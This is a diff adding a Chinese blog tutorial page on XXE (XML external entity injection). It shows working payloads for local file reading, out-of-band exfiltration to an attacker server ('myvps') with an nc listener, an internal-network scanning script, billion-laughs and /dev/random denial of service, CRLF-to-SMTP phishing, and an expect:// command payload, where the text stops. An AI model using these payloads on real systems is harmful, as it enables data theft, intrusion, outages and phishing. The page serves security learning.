@@ -1,0 +1,1075 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head>
+	<title>XXE的升级之旅</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="vint">
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">
+
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="PRELOADER" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+<!-- header -->
+
+	<header id="header-bg-2">
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+	
+	<!-- motto or description -->
+		
+ 		<p class="motto"></p>
+	
+	
+	<!-- current page name or title -->
+	
+		
+		
+			
+			<p class=page-name>当前文章&nbsp;:&nbsp;《XXE的升级之旅》</p>
+			
+		
+	
+	
+	<!-- others: such as change-bg, time... -->
+	<p class="page-name-other">
+		8/14/2019 
+		<style type="text/css">
+	header:after {
+		content: '';
+		position: relative;
+		top: 0;
+		left: 0;
+		height: 100%;
+		width: 100%;
+		background: #222222;
+		opacity: .5;
+		z-index: -1;
+	}
+	
+	.change-header-bg{
+		font-style: normal;
+	}
+	.change-header-bg i{
+		text-align: center;
+		cursor: pointer;
+		pointer-events: bounding-box;
+	}
+	@media(max-width:512px) {
+		.change-header-bg {
+			display: none;
+			visibility: hidden;
+		}
+	}
+	
+</style>
+
+<script type="text/javascript">
+	function changeHeaderBg(){
+		var random_bg = Math.floor(Math.random() * 109 + 1);
+		var bg = 'url(/img/random/' + random_bg + '.jpg)';
+		$("#header-bg-2").css("background-image", bg);
+	}
+</script>
+
+<span class="change-header-bg">
+	——&nbsp;<i  class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
+</span>
+	</p>		
+</header>
+
+<!-- nav -->
+<div id="cd-nav">
+	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="标签">标签</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+    		
+        	
+            	<li class="fa fa-/search"><a href="javascript:;" class="popup-trigger" title="Search">搜索</a></li>
+        	
+		</ul>
+	</nav>
+</div>
+
+		<!--main-->
+		<main> 
+		<div class="page-container">
+		<!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2019/07/21/xxe的升级之旅/" itemprop="url">		
+			XXE的升级之旅		
+		</a>
+	
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2019/07/21/xxe的升级之旅/" itemprop="url">
+	<time datetime="2019-07-20T16:00:00.000Z" itemprop="datePublished">
+  		2019-07-21
+  </time>
+</a>    
+&nbsp;
+					</span>
+					
+					<span>						
+						
+							<i class="fa fa-tags"></i>
+							
+								<a href="#笔记" title="笔记" rel="3">笔记</a>&nbsp;
+													 											
+						
+					</span>
+				</p>
+			</div>
+
+			<div class="am-article-bd">
+				<div class="content" id="post-content">
+					
+						<h1 id="一-什么是xxe"><a href="#一-什么是xxe" class="headerlink" title="一.什么是xxe"></a>一.什么是xxe</h1><p>既然这篇文章说的是xxe的升级之旅，那么什么是xxe呢？</p>
+<p>其实xxe也是一类注入漏洞，英文全名即Xml External Entity Injection,即我们所说的xml外部实体注入攻击。因为实体可以通过预定义在文档中被调用，而实体的标识符又可以访问本地或者远程内容，当允许引用外部实体时，攻击者便可以构造恶意内容来达到攻击。</p>
+<h1 id="二-基础简介"><a href="#二-基础简介" class="headerlink" title="二.基础简介"></a>二.基础简介</h1><p>可能有些人看了上面一堆名词后不知所云，什么xxe，xml，什么外部实体，不用急，我们现在就来慢慢升级。</p>
+<h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><h3 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h3><p>首先要先说下xml。xml是一种可扩展的标记语言，主要就是用来传输数据的，你可以理解为就是一种写法类似于html语言的数据格式文档。但是xml跟html是为不同目的而设计的，html旨在显示数据信息，而xml旨在传输数据信息。</p>
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>跟xml格式相关的就是这个叫dtd（document type definition ）的东西了，这个dtd的作用就是去定义xml文档的合法构建模块，也就是说声明了xml的内容格式规范。</p>
+<p>dtd有两种声明方式：</p>
+<p>1.内部dtd：即对XML文档中的元素、属性和实体的DTD的声明都在XML文档中。 </p>
+<p>2.外部dtd：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件（.dtd）中。 </p>
+<p>让我们来看一下内部dtd的xml示例：</p>
+<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!--XML声明-->
+<?xml version="1.0" encoding="UTF-8"?>
+<!--DTD，文档类型声明-->          
+<!DOCTYPE note [
+<!ELEMENT note (body)>
+<!ELEMENT body (#PCDATA)>
+<!ENTITY writer "hello word">        
+]>
+
+<!--文档元素-->                                                                         
+<note>
+<body>&writer</body>
+</note>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们就dtd的内容一个一个来看，</p>
+<ul>
+<li><p><strong>!DOCTYPE note</strong> (第四行)定义此文档是 <strong>note</strong> 类型的文档。</p>
+</li>
+<li><p><strong>!ELEMENT note</strong> (第五行)定义 <strong>note</strong> 元素有一个元素：”body”</p>
+</li>
+<li><p><strong>!ELEMENT body</strong> (第六行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
+</li>
+<li><strong>!ENTITY writer “hello world”</strong>（第七行）定义了一个内部实体</li>
+</ul>
+<p>也就是说，这样的dtd就定义了xml的根元素是note，然后根元素下有一个body子元素，而且body元素的类型为“#PCDATA”，这样的定义就固定了文档元素的内容格式，而后面body元素里的“&amp;writer”就是对内部实体的一个引用，到输出的时候&amp;writer就会被”hello world“替换，这样说来应该就能大概明白了。</p>
+<p>上面我们说的就是一个内部实体的例子，而我们重点在于外部实体，毕竟我们要讲的就是外部实体注入，下面我们再来看一个引用外部实体的例子：</p>
+<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
+
+<root>
+    <body>&xxe</body>
+</root>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><strong>!ELEMENT foo ANY</strong> (第三行)定义元素为<strong>ANY</strong>,即可以接受任何元素。</li>
+<li><strong>!ENTITY xxe SYSTEM “file:///c:/test.dtd”</strong>（第四行）定义了一个外部实体</li>
+</ul>
+<p>这里样义文档就会对c:/test.dtd文件资源进行引用，这是一种用<strong>SYSTEM</strong>关键字的引用方式，还有一种用<strong>PUBLIC</strong>引用公用DTD的方式：</p>
+<pre class="line-numbers language-dtd"><code class="language-dtd"><!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>通过以上例子，我们可以理解为一个实体其实就是一个变量。</p>
+<p>但是实际上实体不止这一种，实体有四种，而我们以上的实体是其中的一种通用实体。</p>
+<p>这里列一下：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p>其中内置实体和字符实体都和html的实体编码类似，有十进制和十六进制。</p>
+<p>而通用实体我们已经大概了解了，就是刚才那两个例子那样的，下面我们再讲一个参数实体的dtd例子：</p>
+<pre class="line-numbers language-dtd"><code class="language-dtd"><!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
+<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
+%an-element; %remote-dtd;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>通过这个dtd我们可以看出来区别，就是这里实体名前面有个“%”,而在通用实体中是没有的，并且<strong>只能在dtd中使用<code>% 实体名</code></strong>，有不同也有相同的地方，和通用实体一样，参数实体也可以外部引用 dtd。所以这里的重点就是参数实体只能在dtd中使用，引用。</p>
+<h1 id="三-xxe的利用"><a href="#三-xxe的利用" class="headerlink" title="三.xxe的利用"></a>三.xxe的利用</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>前面已经大概介绍了外部实体的作用和运用，下面我们开始进入主题，那么xxe能干什么呢？</p>
+<p>通过上面外部实体的例子:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
+
+&lt;root&gt;
+    &lt;body&gt;&amp;xxe&lt;/body&gt;
+&lt;/root&gt;
+</code></pre><p>有些基础的小伙伴应该马上就能想到一种漏洞利用：<strong>任意文件读取</strong></p>
+<p>为了呈现直观一点，我在本地搭了一个环境：</p>
+<p>xml.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
+    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$dom</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token constant">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>payload:</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype">&lt;!DOCTYPE creds [  
+&lt;!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"></span> ]> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个payload就是尝试去读取我本地的c:/windows/system.ini文件，接下来post试下</p>
+<p>结果如下：</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/1.png" alt="image"></p>
+<p>可以看到成功读取出了system.ini文件中的内容。</p>
+<p>至此我们已经简单复现了xxe一种最简单的利用。</p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>上面我们成功读取了system.ini文件中的内容，可能有的的小伙伴去复现的时候，读取其他文件的时候就有可能发现读取不了，会报错，这是什么原因呢？我们接下来再说一下这种情况。</p>
+<p>如果会报错，原因可能就是文件中有一些特殊符号，比如说“&lt;”,“&gt;”,“&amp;”等等这些符号，在引用的时候也给xml解析器解析了，因此就会报错，从而读取失败。</p>
+<p>来模拟一下这种场景，新建一个test.txt</p>
+<pre><code>12343545423#information
+&lt;info&gt;sslicve&lt;for&gt;
+test &lt;content&gt;
+</code></pre><p>内容如上，然后读取一下看看：</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/2.png" alt="image"></p>
+<p>确实是什么都读不出来，还报了一堆错。</p>
+<p>那这种情况怎么解决呢？</p>
+<p>这时候就需要认识一个新名词并且会用，就是“CDATA”</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/3.png" alt="image"></p>
+<p>也就是说，我们可以将脚本代码定义为“CDATA”,CDATA 部分中的所有内容就会被解析器忽略，也就可以继续愉快地读取文件了。 </p>
+<p>我们来试试，把payload修改为</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE roottag [
+&lt;!ENTITY start &quot;&lt;![CDATA[
+&lt;!ENTITY % xxe SYSTEM &quot;file:///d:/test.txt&quot;&gt; ]]&gt; 
+&quot;&gt;]
+% xxe;
+&gt;  
+
+&lt;roottag&gt;&amp;start&lt;/roottag&gt;
+</code></pre><p>这样payload看起来好像没什么问题，但其实拿这个payload去打还是一样读取不出来。</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/4.png" alt="image"></p>
+<p>xml解析器有个限制就是不能在内部Entity 中引用，“PEReferences forbidden in internal subset in Entity ”指的就是禁止内部参数实体引用。</p>
+<p>既然内部不行，那如果我把那内容换到外部呢？试试来</p>
+<p>修改payload：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE root [
+&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
+&lt;!ENTITY % go SYSTEM &quot;file:///d:/test.txt&quot;&gt;  
+&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
+&lt;!ENTITY % dtd SYSTEM &quot;http://myvps/evil.dtd&quot;&gt; 
+%dtd; ]&gt; 
+
+&lt;root&gt;&amp;all;&lt;/root&gt;
+</code></pre><p>同时在我的vps上放一个evil.dtd，内容为：</p>
+<pre><code>&lt;!ENTITY all &quot;%start;%go;%end;&quot;&gt;
+</code></pre><p><img src="https://v1ntlyn.github.io/post/2019.7.20/5.png" alt="image"></p>
+<p>ok到这里终于没再出错了。</p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>实际上现在有回显的xxe已经很少了，接下来我们就来想办法在没有xxe回显的情况下怎么利用。</p>
+<p>既然没有回显数据，那我们就要想办法让服务器自己把数据往外带。</p>
+<p>其实在level 2中应该就能想到了，既然外部实体能够请求外部url资源内容，也就是说可以访问外面url，这样的话我们可以写两个外部参数实体，第一个用来请求本地数据内容，第二个用http协议或者其他协议把请求到的数据作为参数带到我们的vps，这样就实现了数据外带了。</p>
+<p>payload：</p>
+<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?>
+<!DOCTYPE message [
+    <!ENTITY % remote SYSTEM "http://myvps/xml.dtd">  
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///d:/test.txt">
+    %remote;
+    %send;
+]>
+<message>1234</message>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>xml.dtd</p>
+<pre class="line-numbers language-dtd"><code class="language-dtd"><!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://myvps:1111/?%file;'>">
+%start;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>同时在vps上开启nc监听1111端口，接受数据</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/6.png" alt="image"></p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/7.png" alt="image"></p>
+<p>ok成功把数据带出来了，这里要补充的一点是，在xml.dtd中，之所以要把“%”转成html实体编码是因为在实体的值中不能有“%”，所以也就只能转成<code>&amp;#x25</code>了。</p>
+<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>接下来也越来越好玩了，因为上面我们讲到的利用都只是任意文件读取，而xxe漏洞的利用远不止这些。</p>
+<p>比如说，xxe由于可以访问外部url，也就有类似ssrf的攻击效果，同样的，也可以利用xxe来进行内网探测。</p>
+<p>可以先通过file协议读取一些配置文件来判断内网的配置以及规模，以便于编写脚本来探测内网。</p>
+<p>一个python脚本实例：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+
+<span class="token comment" spellcheck="true">#Origtional XML that the server accepts</span>
+<span class="token comment" spellcheck="true">#&lt;xml></span>
+<span class="token comment" spellcheck="true">#    &lt;stuff>user&lt;/stuff></span>
+<span class="token comment" spellcheck="true">#&lt;/xml></span>
+
+
+<span class="token keyword">def</span> <span class="token function">build_xml</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>
+    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>
+    send_xml<span class="token punctuation">(</span>xml<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_xml</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">}</span>
+    x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/xml.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># a little split to get only the base64 encoded value</span>
+    <span class="token keyword">print</span> coded_string
+<span class="token comment" spellcheck="true">#   print base64.b64decode(coded_string)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        i <span class="token operator">=</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        ip <span class="token operator">=</span> <span class="token string">'192.168.1.'</span> <span class="token operator">+</span> i
+        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">'/'</span>
+        <span class="token keyword">print</span> string
+        build_xml<span class="token punctuation">(</span>string<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"error"</span>
+<span class="token keyword">continue</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>运行起来大概是这样</p>
+<p><img src="https://v1ntlyn.github.io/post/2019.7.20/8.png" alt="image"></p>
+<p>既然可以主机探测了，那么内网主机端口探测也是类似的思路。</p>
+<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>除了可以内网探测，还可以DOS攻击。。</p>
+<p>比如说：</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此payload测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。 </p>
+<p>如果目标是UNIX系统，</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>
+<span class="token doctype">&lt;!DOCTYPE foo [ 
+  &lt;!ELEMENT foo ANY ></span>
+  &lt;!ENTITY xxe SYSTEM "file:///dev/random" >]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这段payload会让xml解析器尝试使用/dev/random文件中的内容来替代实体，所以这个示例会直接使UNIX系统服务器崩溃。</p>
+<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>还有比较好玩的玩法，当然了这个需要在特定类型的场景中运用，比如说xxe还可以运用于钓鱼。</p>
+<p>（以下实例来源于freebuf中的一篇文章）</p>
+<p>如果内网中有一台存在CRLF注入漏洞的SMTP服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼 。</p>
+<p>Java支持在<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/net/ftp/impl/FtpClient.java" target="_blank" rel="noopener">sun.net.ftp.impl.FtpClient</a>中的ftp URI，因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。" target="_blank" rel="noopener">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
+<p>但是如果我们将%0D%0A (<a href="https://www.owasp.org/index.php/CRLF_Injection" target="_blank" rel="noopener">CRLF</a>)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
+<pre><code>ftp://a%0D%0A
+EHLO%20a%0D%0A
+MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
+RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
+DATA%0D%0A
+From%3A%20support%40VULNERABLESYSTEM.com%0A
+To%3A%20victim%40gmail.com%0A
+Subject%3A%20test%0A
+%0A
+test!%0A
+%0D%0A
+.%0D%0A
+QUIT%0D%0A
+:a@VULNERABLESYSTEM.com:25
+</code></pre><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
+<pre><code>ftp://a
+EHLO a
+MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;
+RCPT TO: &lt;victim@gmail.com&gt;
+DATA
+From: support@VULNERABLESYSTEM.com
+To: victim@gmail.com
+Subject: Reset your password
+We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
+.
+QUIT
+:support@VULNERABLESYSTEM.com:25
+</code></pre><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。 </p>
+<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p> 最吸引人的还是RCE了，那么问题来了，xxe能RCE吗？</p>
+<p>答案是可以的，不过还是那句话，在<strong>特定</strong>场景下。</p>
+<p>由于PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE 。</p>
+<p>示例代码：</p>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"></span>]>
